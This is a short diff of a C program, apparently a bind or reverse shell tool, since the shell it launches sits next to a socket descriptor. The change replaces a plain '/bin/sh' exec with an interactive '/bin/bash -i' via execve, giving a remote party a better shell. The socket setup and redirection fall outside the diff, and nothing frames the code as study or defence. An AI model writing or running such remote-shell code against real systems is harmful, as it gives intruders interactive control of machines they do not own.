@@ -34,7 +34,9 @@ int main(){
 	}
 
 
-    execl("/bin/sh","sh",NULL);
+//    execl("/bin/sh","sh",NULL);
+    execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
+
 
     close(sockfd);
     return 0;
